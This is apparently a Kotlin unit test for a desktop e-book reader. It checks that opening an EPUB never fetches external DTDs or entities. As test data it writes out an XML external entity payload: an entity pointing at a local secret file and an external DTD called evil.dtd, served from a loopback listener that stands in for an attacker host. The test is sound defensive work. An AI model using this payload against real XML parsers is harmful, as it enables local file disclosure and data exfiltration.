package zoukan.desktop.local

import io.kotest.matchers.shouldBe
import org.junit.jupiter.api.Test
import org.junit.jupiter.api.io.TempDir
import java.io.File
import java.net.InetAddress
import java.net.ServerSocket
import java.net.SocketTimeoutException
import java.util.concurrent.CompletableFuture
import java.util.concurrent.TimeUnit
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

/** An EPUB is untrusted: opening one must not fetch anything its XML points to. */
class EpubExternalEntityTest {
    @TempDir
    lateinit var dir: File

    @Test
    fun `an EPUB cannot make the parser fetch an external DTD or entity`() {
        ServerSocket(0, 1, InetAddress.getLoopbackAddress()).use { server ->
            server.soTimeout = 1500
            val contacted = CompletableFuture.supplyAsync {
                try {
                    server.accept().close()
                    true
                } catch (_: SocketTimeoutException) {
                    false
                }
            }
            val url = "http://127.0.0.1:${server.localPort}"
            val secret = File(dir, "secret.txt").apply { writeText("SECRET") }
            val container = """
                <?xml version="1.0"?>
                <!DOCTYPE container [
                  <!ENTITY % file SYSTEM "${secret.toURI()}">
                  <!ENTITY % dtd SYSTEM "$url/evil.dtd">
                  %dtd;
                  <!ENTITY general SYSTEM "$url/general">
                ]>
                <container xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
                  <rootfiles><rootfile full-path="content.opf"/></rootfiles>&general;
                </container>
            """.trimIndent()
            val opf = """
                <?xml version="1.0"?>
                <!DOCTYPE package SYSTEM "$url/package.dtd">
                <package xmlns="http://www.idpf.org/2007/opf">
                  <manifest><item id="p1" href="1.png"/></manifest>
                  <spine><itemref idref="p1"/></spine>
                </package>
            """.trimIndent()
            val epub = File(dir, "book.epub")
            ZipOutputStream(epub.outputStream()).use { zip ->
                mapOf("META-INF/container.xml" to container, "content.opf" to opf, "1.png" to "png").forEach { (name, text) ->
                    zip.putNextEntry(ZipEntry(name))
                    zip.write(text.toByteArray())
                    zip.closeEntry()
                }
            }

            // Whether it opens or refuses the file, nothing may be fetched
            runCatching { LocalFormat.open(epub).use { it.pageCount } }

            contacted.get(10, TimeUnit.SECONDS) shouldBe false
        }
    }
}
